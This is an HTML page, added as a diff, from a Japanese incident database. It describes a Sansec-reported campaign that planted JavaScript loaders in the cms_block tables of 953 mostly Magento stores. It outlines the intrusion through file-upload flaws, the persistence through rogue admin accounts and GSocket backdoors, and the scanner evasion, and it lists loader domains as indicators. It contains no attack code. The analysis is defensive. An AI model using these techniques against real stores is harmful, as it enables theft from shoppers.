@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
+<title>Magento 953店舗にローダー常駐 — インシデント事例DB</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --surface: #161b22;
+  --surface2: #21262d;
+  --border: #30363d;
+  --border-2: #21262d;
+  --text: #e6edf3;
+  --dim: #8b949e;
+  --dim-2: #6e7681;
+  --faint: #484f58;
+  --accent: #58a6ff;
+  --ok: #3fb950;
+  --warn: #d29922;
+  --danger: #f85149;
+  --purple: #a371f7;
+  --purple-2: #d2a8ff;
+  --orange: #db6d28;
+  --code: #161b22;
+  --grp-a: #f85149;
+  --grp-b: #3fb950;
+  --grp-c: #d29922;
+  --grp-s: #8b949e;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);
+ font-family:-apple-system,'Hiragino Kaku Gothic Pro','Meiryo',sans-serif;
+ font-size:14px;line-height:1.75;overflow-wrap:anywhere}
+/* **長い機械文字列だけを折る。** CVSS ベクタ（69字）・SHA-256（64字）・
+   ウォレットアドレス（42字）は空白が無いので折り返せず、375px では
+   ページ全体が 474px まで横に伸びていた（2026-09-08 の実測）。
+   `word-break:break-all` は日本語の本文まで無条件に切ってしまうので使わない。
+   `overflow-wrap:anywhere` は**入りきらないときだけ**折り、加えて
+   min-content を縮めるのでグリッドの列が押し広げられなくなる
+   （break-word だと min-content が縮まず .figs の列がはみ出したまま）。
+   nowrap を指定したバッジ・表見出しには効かない（そちらが優先される）。 */
+/* **固定するのは h1 だけ。** ヘッダ全体を固定していたため、スクロール中も
+   サブタイトル（3行）とバッジが居座って画面を占有していた（2026-08-29 の指摘）。
+   h1 を header の外に出してあるのは、sticky が親の範囲内でしか効かないため。 */
+h1.stickytitle{position:sticky;top:0;z-index:100;margin:0;
+ background:var(--surface);border-bottom:1px solid var(--border);
+ padding:11px 20px;font-size:18px;font-weight:700;line-height:1.4;
+ display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;
+ overflow:hidden}
+h1.stickytitle .stid{font-family:monospace;font-size:11.5px;color:var(--dim);
+ font-weight:400;margin-right:9px}
+.site-header{background:var(--surface);border-bottom:1px solid var(--border);
+ padding:10px 20px 12px}
+.site-header .id{font-family:monospace;font-size:12px;color:var(--dim)}
+/* サブタイトル。元の長いタイトルを降ろす場所。**主張を弱めて場所を取らせない**
+   （スマホで h1 が6行・画面の22%を占めていた。2026-08-29） */
+.site-header .subtitle{font-size:12.5px;line-height:1.65;color:var(--dim);
+  margin:0 0 8px;font-weight:400}
+@media(max-width:600px){
+  h1.stickytitle{font-size:16px;padding:9px 12px;line-height:1.38}
+  .site-header{padding:8px 12px 10px}
+  /* 狭い画面ではサブタイトルを3行で切る。全文は本文冒頭の要約で読める */
+  .site-header .subtitle{font-size:12px;line-height:1.6;
+    display:-webkit-box;-webkit-line-clamp:3;-webkit-box-orient:vertical;
+    overflow:hidden}
+}
+.wrap{max-width:1100px;margin:0 auto;padding:20px}
+/* **本文の行長は保つ。** 幅を広げても段落まで広げると読みにくくなる。
+   1440px で測ると本文はすでに1行60字あり、日本語の適正（40〜50字）を
+   超えていた（2026-08-31）。広げた分は表・図・年表に使わせる。 */
+.wrap p,.wrap li,.lead,.absent,.ctl{max-width:900px}
+.twrap,.figs,table.g,.tl,.part{max-width:none}
+.b{display:inline-block;font-size:11px;font-weight:600;padding:1px 7px;
+ border-radius:4px;margin:0 4px 3px 0;white-space:nowrap;vertical-align:middle}
+.b.type{background:#64b5f626;color:var(--accent);border:1px solid var(--accent)}
+.b.type2{color:var(--accent);border:1px solid #64b5f655}
+.b.st,.b.jr{color:var(--dim);border:1px solid var(--border)}
+.b.cause{color:var(--warn);border:1px solid #ffcc8055}
+.b.role{background:var(--surface2);color:var(--text)}
+.b.lc{color:var(--dim);border:1px solid var(--border)}
+.b.conf{background:#64b5f626;color:var(--accent)}
+.b.org{color:var(--dim);border:1px solid var(--border)}
+.b.sub{color:var(--warn);border:1px solid #ffcc8055}
+.b.rsn{color:var(--warn);border:1px solid #ffcc8055}
+.b.dk{color:var(--danger);border:1px solid #f48fb155}
+.b.kind{color:var(--dim);border:1px solid var(--border)}
+.b.slot{color:var(--dim);border:1px solid var(--border);font-weight:400}
+.b.tag{background:var(--surface2);color:var(--dim)}
+.b.rev,.b.ind,.b.refl{color:var(--ok);border:1px solid #80cbc455}
+.b.fu,.b.dead{color:var(--danger);border:1px solid #f48fb155}
+.lead{background:var(--surface);border-left:3px solid var(--accent);
+ padding:14px 16px;border-radius:0 6px 6px 0;margin:16px 0}
+.upd{background:var(--surface);border-left:3px solid var(--warn, #d29922);
+ padding:10px 16px;border-radius:0 6px 6px 0;margin:0 0 16px;font-size:13px}
+.upd-h{display:flex;gap:12px;align-items:baseline;flex-wrap:wrap;margin-bottom:4px}
+.upd-d{font-weight:600;color:var(--warn, #d29922)}
+.upd a{margin-left:auto}
+.meta{display:flex;gap:20px;flex-wrap:wrap;font-size:12px;color:var(--dim);margin:10px 0 4px}
+section{margin:26px 0}
+section h2{font-size:15.5px;color:var(--accent);border-bottom:1px solid var(--border);
+ padding-bottom:6px;margin-bottom:10px;line-height:1.55}
+section p{margin:9px 0}
+.srcs{font-size:11px;color:var(--dim);font-weight:400;margin-left:6px;white-space:nowrap}
+.blk{margin:26px 0}
+.blk h3{font-size:13px;color:var(--dim);text-transform:uppercase;letter-spacing:.06em;
+ margin-bottom:10px;border-bottom:1px solid var(--border);padding-bottom:5px}
+/* 関係した組織（B79）——表ではなく1組織1ブロック。
+   画面が広いときだけ 名前｜説明 の2段組にする。説明は中央値72字の文章なので、
+   狭い画面では幅を全部使わせる */
+.orgs{margin:6px 0}
+.org{display:grid;grid-template-columns:minmax(150px,210px) 1fr;gap:3px 16px;
+ padding:10px 0;border-top:1px solid var(--border)}
+.org:first-child{border-top:none;padding-top:2px}
+.org-h{display:flex;flex-wrap:wrap;gap:5px;align-items:baseline}
+.org-n{font-weight:600;font-size:13px;line-height:1.5}
+.org-b{font-size:13px;line-height:1.75}
+.org-p{margin:0 0 4px}
+.org-p:last-child{margin-bottom:0}
+.org-l{display:inline-block;min-width:2.6em;margin-right:8px;font-size:11px;
+ color:var(--dim);font-weight:600}
+@media(max-width:600px){
+ .org{grid-template-columns:1fr;gap:5px}
+ .org-b{font-size:12.5px}
+}
+table.g{border-collapse:collapse;width:100%;font-size:13px;margin:6px 0}
+/* 表は自分の中で横に流す。ページ全体が横スクロールすると本文が読めなくなる
+   （スマホで 811px の表がはみ出していた。2026-08-29） */
+.twrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:6px 0}
+.twrap table.g{margin:0}
+table.g th{background:var(--surface2);padding:7px 9px;text-align:left;
+ border:1px solid var(--border);font-weight:600;white-space:nowrap}
+table.g td{padding:7px 9px;border:1px solid var(--border);vertical-align:top}
+table.g tr:nth-child(even) td{background:rgba(255,255,255,.02)}
+table.dt th{width:150px;color:var(--dim)}
+.on{font-weight:600}
+.sm{font-size:12px;color:var(--dim);line-height:1.6}
+.nowrap{white-space:nowrap} .tw{width:132px}
+.figs{display:grid;grid-template-columns:repeat(auto-fill,minmax(min(270px,100%),1fr));gap:10px}
+.fig{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:11px 13px}
+.fh{display:flex;flex-wrap:wrap;align-items:baseline;gap:4px;margin-bottom:5px}
+.fl{font-size:12px;color:var(--dim);flex:1;min-width:100%;line-height:1.5}
+.fv{font-size:23px;font-weight:700;line-height:1.25}
+.fu{font-size:12px;font-weight:400;color:var(--dim);margin-left:4px}
+.fa{font-size:11px;color:var(--dim);margin-top:2px}
+.fn{font-size:11.5px;color:var(--dim);margin-top:7px;padding-top:7px;
+ border-top:1px solid var(--border);line-height:1.65}
+.corr{font-size:11.5px;margin-top:6px;padding:5px 8px;background:var(--surface2);
+ border-radius:4px;color:var(--warn)}
+.box{border-radius:8px;padding:14px 16px;margin:26px 0}
+.box .bt{font-size:13px;font-weight:700;margin-bottom:9px}
+.box .bc{display:inline-block;font-size:11px;padding:0 7px;border-radius:9px;
+ margin-left:7px;background:rgba(255,255,255,.09)}
+.box ul{list-style:none}
+.box li{padding:7px 0;border-top:1px solid rgba(255,255,255,.07)}
+.box li:first-child{border-top:none}
+.unk{background:#ffcc8014;border:1px solid #ffcc8044}
+.unk .bt{color:var(--warn)}
+.disc{background:#f48fb114;border:1px solid #f48fb144}
+.disc .bt{color:var(--danger)}
+.rep-box{background:#80cbc414;border:1px solid #80cbc444}
+.rep-box .bt{color:var(--ok)}
+.rep{padding:8px 0;border-top:1px solid rgba(255,255,255,.07)}
+.rep:first-of-type{border-top:none}
+.ui{font-weight:600;margin-right:6px}
+.cl{margin-left:18px} .cl li{margin:2px 0}
+.sub{font-size:12.5px;padding:3px 0;color:var(--text)}
+.rg{margin-bottom:16px}
+.rgt{font-size:12px;font-weight:700;color:var(--accent);margin-bottom:5px}
+.rg ol{list-style:none}
+.rg li{font-size:12.5px;padding:4px 0;line-height:1.7}
+.rid{font-family:monospace;color:var(--dim);margin-right:3px}
+a{color:var(--accent);text-decoration:none} a:hover{text-decoration:underline}
+code{background:var(--code);border-radius:3px;padding:1px 5px;font-size:12px;color:#a5b4fc}
+ul,ol{margin:8px 0 8px 20px} li{margin:3px 0}
+strong{color:#f1f5f9}
+/* 目次 — 広い画面では左に追従、狭い画面では折りたたみ */
+html{scroll-behavior:smooth}
+.blk,section,.part,.box,.less{scroll-margin-top:92px}
+.toc{background:var(--surface);border:1px solid var(--border);border-radius:8px;
+ padding:12px 14px;margin:18px 0}
+.toc>summary{cursor:pointer;font-size:13px;font-weight:700;color:var(--accent);
+ list-style:none}
+.toc>summary::-webkit-details-marker{display:none}
+.toc>summary::before{content:"▾ ";font-size:11px}
+.toc:not([open])>summary::before{content:"▸ "}
+.tocl{list-style:none;margin:10px 0 0;padding:0;
+ columns:2;column-gap:22px}
+.tocl li{margin:0;break-inside:avoid}
+.tocl li.tg{font-size:11px;font-weight:700;letter-spacing:.04em;margin:9px 0 3px;
+ padding-top:7px;border-top:1px solid var(--border)}
+.tocl li.tg:first-child{margin-top:0;padding-top:0;border-top:none}
+.tocl li.tg1{color:var(--accent)}
+.tocl li.tg2{color:var(--ok)}
+.tocl li.tg3{color:var(--dim)}
+.tocl a{display:block;font-size:12.5px;padding:2.5px 0;line-height:1.55;
+ color:var(--text);text-decoration:none}
+.tocl a:hover{color:var(--accent);text-decoration:underline}
+@media(min-width:1180px){
+ /* PC で左右に大きな余白ができて「狭い」と見えていたので広げた
+    （1440px の画面で コンテナ1180px・本文870px＝画面の60%だった）。
+    minmax(0,1fr) にしないと、広い表が入ったときにカラムがはみ出す */
+ .wrap{max-width:1400px;display:grid;grid-template-columns:260px minmax(0,1fr);
+   gap:38px;align-items:start}
+ .wrap>.meta,.wrap>.lead,.wrap>footer{grid-column:2}
+ .toc{grid-column:1;grid-row:1 / span 99;position:sticky;top:92px;
+   max-height:calc(100vh - 110px);overflow:auto;margin:0}
+ .tocl{columns:1}
+ .toc>summary{pointer-events:none}
+ .toc>summary::before{content:""}
+}
+@media(max-width:1179px){
+ .tocl{max-height:none}
+}
+@media(min-width:1180px){
+ /* 本文カラムが広くなった分、段落だけ行長を保つ（表と図は全幅を使う） */
+ .wrap>*:not(.toc) p,.wrap>*:not(.toc) li{max-width:960px}
+}
+@media(max-width:600px){
+ .tocl{columns:1}
+}
+/* 2部構成の仕切り */
+.part{margin:34px 0 20px;padding:14px 16px;border-radius:8px}
+.part .ph{font-size:17px;font-weight:700;display:flex;align-items:center;gap:10px}
+.part .pn{font-size:11px;font-weight:700;padding:2px 9px;border-radius:4px;letter-spacing:.04em}
+.part .pd{font-size:12px;color:var(--dim);margin-top:6px;line-height:1.75}
+.p1{background:#64b5f612;border:1px solid #64b5f644;border-left:4px solid var(--accent)}
+.p1 .ph{color:var(--accent)} .p1 .pn{background:var(--accent);color:#0f1117}
+.p2{background:#80cbc412;border:1px solid #80cbc444;border-left:4px solid var(--ok)}
+.p2 .ph{color:var(--ok)} .p2 .pn{background:var(--ok);color:#0f1117}
+.blknote{font-size:11.5px;color:var(--dim);margin:-4px 0 10px;line-height:1.7}
+/* 攻撃の経過 */
+.chain{list-style:none;margin:10px 0 0}
+.chain li{position:relative;padding:10px 0 10px 16px;border-left:2px solid var(--border);
+ margin-left:4px}
+.chain li::before{content:"";position:absolute;left:-6px;top:16px;width:9px;height:9px;
+ border-radius:50%;background:var(--accent)}
+.stg{margin-bottom:5px}
+.b.stage{background:#64b5f626;color:var(--accent)}
+.b.do,.b.eff,.b.assess,.b.axis{color:var(--dim);border:1px solid var(--border)}
+/* 対応の指標 */
+.mets{display:grid;grid-template-columns:repeat(auto-fill,minmax(min(160px,100%),1fr));gap:9px}
+.met{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:10px 12px}
+.ml{font-size:11.5px;color:var(--dim);line-height:1.5}
+.mv{font-size:22px;font-weight:700;margin-top:3px}
+.dec{list-style:none;margin:6px 0 0}
+.dec li{padding:9px 0;border-top:1px solid var(--border)}
+.dec li:first-child{border-top:none}
+/* 構造図 */
+.dia{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:14px}
+.diat{font-size:13px;font-weight:700;margin-bottom:8px}
+.svgwrap{overflow-x:auto}
+.svgwrap svg{min-width:620px}
+/* 学び */
+.less{background:#80cbc40e;border:1px solid #80cbc433;border-radius:8px;
+ padding:14px 16px;margin:18px 0}
+.lesst{font-size:13px;font-weight:700;color:var(--ok);margin-bottom:8px}
+.less ul{list-style:none;margin:0}
+.less li{padding:11px 0;border-top:1px solid rgba(255,255,255,.07)}
+.less li:first-child{border-top:none}
+.lp{font-weight:700;line-height:1.65}
+.lw{font-size:12.5px;color:var(--dim);margin-top:4px;line-height:1.7}
+.la{font-size:12.5px;margin-top:6px;padding:7px 10px;background:var(--surface2);
+ border-radius:5px;line-height:1.7}
+.la b{color:var(--ok);margin-right:6px}
+/* 内容が無いことを明示する箱（黙って省略しない） */
+.absent{font-size:12.5px;color:var(--dim);background:var(--surface);
+ border:1px dashed var(--border);border-radius:6px;padding:11px 13px;line-height:1.75}
+.less.empty{background:transparent;border-style:dashed}
+.less.empty .lesst{color:var(--dim)}
+.chk{color:var(--ok);font-weight:700;margin-right:5px}
+.cl.ok li{color:var(--text)} .cl.warn li{color:var(--warn)}
+.ctl{padding:2px 0;font-size:12.5px}
+footer{border-top:1px solid var(--border);margin-top:40px;padding:18px 0;
+ font-size:11.5px;color:var(--dim);line-height:1.9}
+@media(max-width:600px){
+ .wrap{padding:14px 12px} .figs{grid-template-columns:1fr}
+ table.g{font-size:12px} table.dt th{width:auto}
+ .twrap{width:auto}
+ .twrap table.g{min-width:520px}
+}
+</style>
+</head>
+<body>
+<h1 class="stickytitle"><span class="stid">INC-2026-0703</span>Magento 953店舗にローダー常駐</h1>
+<header class="site-header">
+  <p class="subtitle">**Magento を中心に953店舗へ JavaScript のローダーが仕込まれ続けている。** EC セキュリティ企業 Sansec が2026年10月24日に公表した追跡で、 同一の攻撃者が2025年7月から15か月にわたり**5つのローダードメインを数か月ごとに 乗り換えながら**、店舗の `cms_block` テーブル（Magento が店頭ページへ描画する 静的ブロック）にスクリプトを書き込んでいた。 最新の `deepveindrilling.com` は83店舗で見つかり、**うち60店舗は以前の ローダーを既に走らせていた常習の被害者**である。 **最も重い指摘は「パッチ済みの店舗にも入る」こと**—— Magento 2.4.7-p10・コアパッチの欠けが無い店舗が、 **清浄と判定されたスキャンの1時間後**（2026年10月23日16:46 UTC）に ローダーを読み込んだ。その店舗では9月16日に不正な管理者アカウント、 9月24日に GSocket バックドアが見つかっていた。 **侵入経路は Magento のファイルアップロードの不備** （PolyShell／CVE-2026-48356・SessionReaper／CVE-2025-54236）で、 2026年3月30日には1時間で471店舗へ一斉に仕込まれている。 10月23日版のローダーは**訪問者のブラウザを指紋採取して自動化ブラウザをふるい分け**、 スキャナには何も返さない。**最終ペイロードは Sansec もまだ捕まえていない。**</p>
+  <div><span class="b type">脅威・攻撃キャンペーン</span><span class="b type2">不正アクセス・侵害</span><span class="b st">続報が続いている</span><span class="b jr">有名事象として記録（日本と直接の関係は薄い）</span><span class="b cause">既知の脆弱性の悪用</span><span class="b cause">脆弱性の放置</span><span class="b cause">権限管理の不備</span></div>
+</header>
+<div class="wrap">
+
+<div class="meta">
+  <span>初報: 2026年10月24日（Sansec の公表日）</span>
+  <span>最終更新: 2026年10月27日（本記録の作成時点）</span>
+</div>
+
+<div class="lead"><p>EC セキュリティ企業 <strong>Sansec</strong> は2026年10月24日、オンライン店舗に JavaScript のローダーを仕込み続けている攻撃者の追跡結果を公表しました。<strong>2025年7月以降、953店舗（ほとんどが Magento）が被害を受けており、攻撃者は数か月ごとにローダーのドメインを乗り換えています</strong>（出典1）。</p>
+<p>仕込まれる場所は Magento の <strong><code>cms_block</code> テーブル</strong>です（店頭ページへ描画される静的ブロック）。eComscan はキャンペーン全体で<strong>148のサーバインストール</strong>でここにローダーを見つけており、<strong><code>core_config_data</code> やテーマファイルでは一度も見つかっていません</strong>（出典1）。</p>
+<p><strong>本記録が最も重いと判断したのは、「パッチ済みでも入る」という一節です。</strong></p>
+<blockquote>
+<p>「パッチ済みの店舗にもローダーは入る。Magento 2.4.7-p10 でコアパッチの欠けが無い1店舗が、清浄だったスキャンの1時間後、2026年10月23日16:46 UTC に<code>deepveindrilling.com</code> を読み込んだ。eComscan はその店舗で、9月16日に不正な管理者アカウント、9月24日に GSocket バックドアを見つけていた」（出典1。原文英語。訳は本記録）</p>
+</blockquote>
+<p><strong>パッチは侵入の入口を閉じますが、既に置かれた管理者アカウントとバックドアは閉じません</strong>（本記録の評価）。</p>
+<p>最新のローダー（2026年10月23日版）は、訪問者のブラウザを<strong>指紋採取</strong>して自動化ブラウザをふるい分け、スキャナには何も返しません（出典1）。<strong>urlscan.io が自動化 Chrome で感染店舗を読み込んだときは HTTP 200 が返り、ページに追加された内容は見つかりませんでした</strong>（出典1）。<strong>最終ペイロードは Sansec もまだ捕まえていません</strong>〈未確定2〉。</p></div>
+
+
+<details class="toc" id="toc" open><summary>目次</summary><ol class="tocl"><li class="tg tg1">起きたこと</li><li><a href="#s1" title="公表されていない・確定していないこと">公表されていない・確定していないこと</a></li><li><a href="#s2" title="関係した組織">関係した組織</a></li><li><a href="#s3" title="主な数値">主な数値</a></li><li><a href="#s4" title="攻撃の経過">攻撃の経過</a></li><li><a href="#s5" title="公表・報道からわかったこと（4件）">公表・報道からわかったこと（4件）</a></li><li><a href="#s9" title="事案の詳細">事案の詳細</a></li><li><a href="#s10" title="経過">経過</a></li><li><a href="#s11" title="資料間の食い違い・留保">資料間の食い違い・留保</a></li><li class="tg tg2">ここから学べること</li><li><a href="#s12" title="波及の構造">波及の構造</a></li><li><a href="#s13" title="どこで止められたか">どこで止められたか</a></li><li><a href="#s14" title="対応の評価">対応の評価</a></li><li><a href="#s15" title="CISO・経営層への示唆">CISO・経営層への示唆</a></li><li><a href="#s16" title="セキュリティ技術者への示唆">セキュリティ技術者への示唆</a></li><li><a href="#s17" title="自組織に当てはまるか">自組織に当てはまるか</a></li><li class="tg tg3">資料</li><li><a href="#s18" title="出典">出典</a></li><li><a href="#s19" title="この記録の更新履歴">この記録の更新履歴</a></li><li><a href="#s20" title="タグ">タグ</a></li></ol></details>
+
+<div class="part p1" id="part1"><div class="ph"><span class="pn">Part 1</span>起きたこと</div><div class="pd">公表資料と報道から確認できた事実を記録します。確定した事実・報道にとどまる情報・公表されていない事項を区別して示します。評価や推奨はここには書きません。</div></div>
+<div id="s1"><div class="box unk"><div class=bt>公表されていない・確定していないこと<span class=bc>4</span></div><ul><li><span class=ui>被害店舗の名称・国・規模</span><span class="b rsn">公表されていない</span><div class=sm>**出典1 は店舗名も国も挙げていない**（本記録の確認）。 **日本の店舗が含まれるかは分からない**（本記録の明示）。</div></li><li><span class=ui>最終ペイロードの中身と、訪問者に生じた実害</span><span class="b rsn">探索したが未発見</span><div class=sm>**「Sansec は最終ペイロードをまだ捕まえていない」**（出典1。原文英語。訳は本記録）。 **指紋採取で自動化ブラウザがふるい落とされるためである**（出典1）。 **分かっているのは、2025年12月に Keitaro 段階が実際の訪問者へ Ledger を模した暗号資産系サイトのスクリプトを配信した事実までである**（出典1）。 **訪問者の金銭被害の件数・金額はどこにも示されていない。**</div></li><li><span class=ui>攻撃者の帰属</span><span class="b rsn">公表されていない</span><div class=sm>**出典1 は「犯罪グループ（criminal group）」「オペレータ」と呼ぶだけで、 国・集団名・既知のアクターとの関係を示していない**（本記録の確認）。 **本記録も帰属を判断しない。**</div></li><li><span class=ui>パッチ済み店舗が再侵害された経路の特定</span><span class="b rsn">調査したが確定せず</span><div class=sm>**出典1 が示しているのは「9月16日に不正な管理者アカウント、 9月24日に GSocket バックドアが見つかっていた」という事実であり**（出典1）、 **10月23日の書き込みがそのどちらを使ったかは特定されていない**（本記録の確認）。 **残置された権限が使われたという推定は妥当だが、断定はできない**（本記録の留保）。</div></li></ul></div></div>
+<div class="blk " id="s2"><h3>関係した組織</h3><div class=orgs><div class=org><div class=org-h><span class=org-n>Sansec（Sansec Forensics Team・オランダ Utrecht）</span><span class="b role">報告したベンダー</span><span class="b lc">確認済</span></div><div class=org-b></div></div><div class=org><div class=org-h><span class=org-n>被害を受けたオンライン店舗（953店舗・名称非公表）</span><span class="b role">被害組織</span><span class="b lc">関係未公表</span></div><div class=org-b></div></div><div class=org><div class=org-h><span class=org-n>Adobe（Adobe Commerce / Magento Open Source）</span><span class="b role">製品・部品の供給元</span><span class="b lc">関係未公表</span></div><div class=org-b></div></div><div class=org><div class=org-h><span class=org-n>感染店舗の訪問者（買い物客）</span><span class="b role">波及先（取引先・利用事業者）</span><span class="b lc">推定</span></div><div class=org-b></div></div></div></div>
+<div class="blk " id="s3"><h3>主な数値</h3><div class="blknote">各数値には確度（確定／約／最大）と出所（公表値／報道値／本記録の算出）を付しています。</div><div class=figs><div class=fig><div class=fh><span class=fl>感染が確認された店舗の数（キャンペーン全体）</span><span class="b conf">確定</span><span class="b org">第三者調査</span></div><div class=fv>953<span class=fu>店舗</span></div><div class=fn>**2025年7月以降の累計である**（出典1）。 **店舗の数であり、サーバの数でも事業者の数でもない**（本記録の明示） ——**同一事業者が複数店舗を運営している場合の扱いは示されていない。** **「いま感染している店舗の数」でもない**（本記録の明示）。</div></div><div class=fig><div class=fh><span class=fl>最新ドメイン（deepveindrilling.com）で見つかった店舗の数</span><span class="b conf">確定</span><span class="b org">第三者調査</span></div><div class=fv>83<span class=fu>店舗</span></div><div class=fn>**うち60店舗は以前のローダーを既に走らせていた**（出典1） ——**34店舗は2025年10月から継続している**（出典1）。 **つまり新規は23店舗である**（出典1 の値からの本記録の算出）。</div></div><div class=fig><div class=fh><span class=fl>2026年3月30日の一斉攻撃で1時間に仕込まれた店舗の数</span><span class="b conf">確定</span><span class="b org">第三者調査</span></div><div class=fv>471<span class=fu>店舗</span></div><div class=fn>**PolyShell（CVE-2026-48356）でウェブシェルを置いたうえでの書き込みである** （出典1）。**1時間という速さは、手作業ではなく自動化された処理を示す** （本記録の評価）。</div></div><div class=fig><div class=fh><span class=fl>Sansec Watch が受けた additionalver.com の読み込み報告の数</span><span class="b conf">約</span><span class="b org">第三者調査</span></div><div class=fv>52,000<span class=fu>件</span></div><div class=fn>**「約52,000」**（出典1）。 **訪問者のブラウザからの CSP 違反報告の件数であり、 訪問者の人数でも店舗の数でもない**（本記録の明示） ——**同一の訪問者が複数回報告した分も含まれる。** **Sansec Watch を使っている店舗からの報告に限られる**（本記録の留保）。</div></div><div class=fig><div class=fh><span class=fl>ローダーを持つ Magento 2 インストールのうち PolyShell/SessionReaper 経由のファイルを持つ割合</span><span class="b conf">確定</span><span class="b org">第三者調査</span></div><div class=fv>60<span class=fu>％</span></div><div class=fn>**コアパッチを1つ以上欠く169インストールのうち102件**（出典1）。 **比較として、他のスキマーを持つ3,024インストールでは32%**（出典1） ——**本キャンペーンの侵入経路がこの2つの脆弱性に偏っていることを示す** （出典1 の値に基づく本記録の整理）。</div></div><div class=fig><div class=fh><span class=fl>15か月で使われたローダードメインの数</span><span class="b conf">最少</span><span class="b org">第三者調査</span></div><div class=fv>5<span class=fu>件</span></div><div class=fn>**主要な5件（`manulfie.click` 863／`neswnsssn.click` 494／ `lanhd6549tdhse.top` 355／`additionalver.com` 246／ `deepveindrilling.com` 83店舗）**（出典1）。 **店舗数は重複しうるため単純合計はできない**（出典1。本記録の明示） ——**合計2,041ではなく、累計は953店舗である。** **ほかに少数の店舗で動いた2件（`hdfdsi84j3h.top`・`c85grt98sd.com`）がある** （出典1）ため、**5は下限である。**</div></div></div></div>
+<div class="blk " id="s4"><h3>攻撃の経過</h3><div class="blknote">公表された範囲の事実のみ。公表されていない段階は補完せず明示しています。</div><p>**攻撃の形は「脆弱性で入る → 権限と裏口を残す → データベースのブロックに スクリプトを書く → 訪問者のブラウザで実行させる」である**（出典1。段階への割り当ては本記録）。 **パッチは1段目にしか効かない**（本記録の評価）—— **2段目が残っていれば、3段目は何度でも繰り返せる。**</p><ol class=chain><li><div class=stg><span class="b stage">1. 初期侵入</span><span class="b conf">確認済</span><span class=srcs></span></div><div>**ファイルアップロードの不備でウェブシェルを置く**（出典1）。 **ある店舗（Magento 2.4.7-p1）では、PolyShell のウェブシェルが PNG 画像を装って `pub/media/custom_options/quote/` に置かれていた**（出典1）。</div><div class=fn>根拠: **「3月、オペレータは PolyShell 経由でウェブシェルをアップロードしたうえで、 1時間に471店舗へローダーを注入した」**（出典1。原文英語。訳は本記録）。</div></li><li><div class=stg><span class="b stage">2. 永続化</span><span class="b conf">確認済</span><span class=srcs></span></div><div>**不正な管理者アカウントとバックドア（GSocket）を残す**（出典1）。 **パッチ済みで感染した店舗では、9月16日に管理者アカウント、 9月24日に GSocket バックドアが見つかっていた**（出典1）。</div><div class=fn>根拠: **「パッチ済みの店舗にもローダーは入る。……eComscan はその店舗で 9月16日に不正な管理者アカウント、9月24日に GSocket バックドアを 見つけていた」**（出典1。原文英語。訳は本記録）。</div></li><li><div class=stg><span class="b stage">3. 実行</span><span class="b conf">確認済</span><span class=srcs></span></div><div>**`cms_block` テーブルの `content` にローダーのスクリプトを書き込む**（出典1）。 **2026年10月23日には既存のブロックを書き換えて指紋採取版に差し替えており、 再クロールした71店舗すべてが新版になっていた**（出典1）。</div><div class=fn>根拠: **「eComscan はキャンペーンを通じて148のサーバインストールの `cms_block` でローダーを見つけ、`core_config_data` やテーマファイルでは 一度も見つけていない」**（出典1。原文英語。訳は本記録）。</div></li><li><div class=stg><span class="b stage">4. 検知回避</span><span class="b conf">確認済</span><span class=srcs></span></div><div>**訪問者のブラウザを指紋採取し、自動化ブラウザには何も返さない**（出典1）。 **ドメインの front page は404を返し、感染店舗の訪問者からの スクリプト要求にしか応答しない**（出典1）。 **Cloudflare の背後に置かれている**（出典1）。</div><div class=fn>根拠: **「urlscan.io が自動化 Chrome で感染店舗を読み込んだとき、HTTP 200 が返り、 Sansec はページに追加された内容を見つけられなかった」** （出典1。原文英語。訳は本記録）。</div></li><li><div class=stg><span class="b stage">5. 影響（暗号化・破壊・改ざん）</span><span class="b conf">確認済</span><span class=srcs></span></div><div>**訪問者のブラウザでペイロードを実行する**（出典1）。 **`localStorage` の `fpCode` に保存されるため、 一度受け取った訪問者はドメインが止まっても実行し続ける**（出典1）。 **2025年12月12日には、Ledger の綴り違いのドメインを含む 暗号資産系サイトのスクリプトが実際の顧客へ配信された**（出典1）。</div><div class=fn>根拠: **「一度ペイロードを受け取った訪問者は、 ドメインが止まっていても遮断されていても、 以後のページ表示のたびにそれを実行する」**（出典1。原文英語。訳は本記録）。</div></li></ol></div>
+<section id="s5"><h2>パッチを当てても、先に置かれた管理者アカウントは閉じない<span class="b slot">原因・手口</span></h2><p>Sansec の報告でもっとも重いのは、次の一節である（出典1）。</p>
+<blockquote>
+<p>「パッチ済みの店舗にもローダーは入る。Magento 2.4.7-p10 でコアパッチの欠けが無い1店舗が、清浄だったスキャンの1時間後、2026年10月23日16:46 UTC に <code>deepveindrilling.com</code> を読み込んだ。eComscan はその店舗で、9月16日に不正な管理者アカウント、9月24日に GSocket バックドアを見つけていた」（出典1。原文英語。訳は本記録）</p>
+</blockquote>
+<p><strong>時間の並びを読むと、この店舗で起きたことは「検知の失敗」ではない</strong>（本記録の評価）。</p>
+<table>
+<thead>
+<tr>
+<th>日付</th>
+<th>出来事</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2026年9月16日</td>
+<td>不正な管理者アカウントを<strong>検出</strong>（出典1）</td>
+</tr>
+<tr>
+<td>2026年9月24日</td>
+<td>GSocket バックドアを<strong>検出</strong>（出典1）</td>
+</tr>
+<tr>
+<td>2026年10月23日 15:46 頃</td>
+<td>スキャンが<strong>清浄</strong>と判定（出典1）</td>
+</tr>
+<tr>
+<td>2026年10月23日 16:46 UTC</td>
+<td>ローダーが書き込まれる（出典1）</td>
+</tr>
+</tbody>
+</table>
+<p><strong>検出はできていた。</strong> 残っていたのは、検出したものを無効化する作業である（本記録の評価）。そして<strong>「コアパッチの欠けが無い」という状態は、その作業の完了を意味しない。</strong></p>
+<p><strong>脆弱性管理の指標（パッチ適用率・既知脆弱性の残数）は、この店舗を「対応済み」と数える</strong>（本記録の評価）。<strong>実際には、攻撃者の正規アカウントが生きたまま残っていた。</strong></p></section>
